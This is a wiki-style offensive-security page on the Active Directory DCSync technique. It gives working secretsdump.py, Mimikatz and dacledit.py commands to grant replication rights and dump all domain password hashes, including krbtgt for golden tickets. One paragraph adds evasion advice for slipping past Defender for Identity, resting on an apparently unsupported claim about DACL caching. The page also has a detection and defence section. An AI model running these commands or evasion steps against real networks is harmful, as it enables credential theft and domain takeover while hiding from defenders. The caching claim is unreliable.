---
title: DCSync
slug: dcsync
---

> **TL;DR:** Abuse the MS-DRSR `GetNCChanges` RPC with replication rights to pull password hashes (krbtgt included) from a DC without code execution on the DC.

## What it is
DCs replicate the directory between themselves via the MS-DRSR protocol; the relevant RPC call is `IDL_DRSGetNCChanges`. Any principal granted the extended rights `DS-Replication-Get-Changes` (1131f6aa-9c07-11d1-f79f-00c04fc2dcd2), `DS-Replication-Get-Changes-All` (1131f6ad-…), and on modern DCs `DS-Replication-Get-Changes-In-Filtered-Set` can call that RPC remotely and receive credential material in the response. Mimikatz's `lsadump::dcsync` and Impacket's `secretsdump.py` are the canonical clients. The DC sees a legitimate replication request — it has no code-execution footprint on the DC itself.

## Preconditions / where it applies
- All three replication-related extended rights on the domain naming context (default: Domain Admins, Enterprise Admins, Administrators, the DCs themselves).
- Network reach to a DC on TCP 135 + dynamic RPC (or 49152-65535).
- Any auth method that yields a working SSPI context — password, NT hash, Kerberos ticket.
- Frequently chained from [[acl-abuse]]: WriteDACL on the domain head → grant yourself the rights → DCSync.

## Technique
Verify rights, then pull. Pulling just `krbtgt` is enough to forge [[golden-tickets|golden tickets]]; pulling everything gives you full hash dump.

```bash
# Impacket — every secret from the domain
secretsdump.py -just-dc corp.lab/da:'pw'@dc.corp.lab
# Single account
secretsdump.py -just-dc-user krbtgt corp.lab/da:'pw'@dc.corp.lab
```

```powershell
# Mimikatz
lsadump::dcsync /domain:corp.lab /user:krbtgt
lsadump::dcsync /domain:corp.lab /all /csv
```

To grant DCSync from an ACL primitive (WriteDACL on domain head):

```bash
dacledit.py -action write -rights DCSync -principal me corp.lab/me:'pw'@dc
```

Output includes NT hash, LM hash if present, Kerberos keys (AES256, AES128, DES), and supplemental credentials with cleartext if Reversible Encryption was set. Pass each into pass-the-hash, [[silver-tickets]], or offline cracking.

Subtle variants:
- **DCSync against a child** to grab the child's krbtgt → forge inter-realm referral with SID History → forest compromise ([[child-to-forest-root]]).
- **DCShadow** writes attributes back through replication — see [[ad-persistence]].

For surgical use on-host, `lsadump::dcsync /user:krbtgt` alone is enough — Mimikatz picks the local domain and a DC automatically via the standard DC locator, so a single-line invocation against just the krbtgt principal stays well under the noise threshold of a `/all /csv` sweep and produces the exact AES + RC4 keys needed for an immediate golden ticket forge. From an unprivileged shell where the operator only just granted themselves the rights, sleep at least 5–15 minutes before pulling: the DC RPC interface caches DACL evaluations and a sub-minute `WriteDACL → DCSync` chain is a high-fidelity Defender for Identity signature.

## Detection and defence
- Microsoft event 4662 with the GUIDs above is the gold-standard signal. Properties `{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}` and `{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}` on a non-DC source are anomalous.
- Defender for Identity and most XDRs detect DCSync on DRSR traffic patterns from non-DC hosts.
- Audit who has the rights — script-walk the domain head DACL on every change.
- Remove unused replication rights; never grant `DS-Replication-Get-Changes-All` to non-tier-0 accounts.
- After incident: rotate krbtgt twice with 10h gap; rotate all account passwords assumed dumped.

## References
- [HackTricks — DCSync](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/dcsync.html) — usage walkthrough
- [the.hacker.recipes — DCSync](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync) — primitive reference
- [Microsoft — MS-DRSR](https://learn.microsoft.com/openspecs/windows_protocols/ms-drsr/) — replication protocol spec
- [SpecterOps — DCSync detection](https://posts.specterops.io/) — 4662 hunting patterns
- [ired.team — DCSync](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync) — lsadump::dcsync krbtgt extraction lab
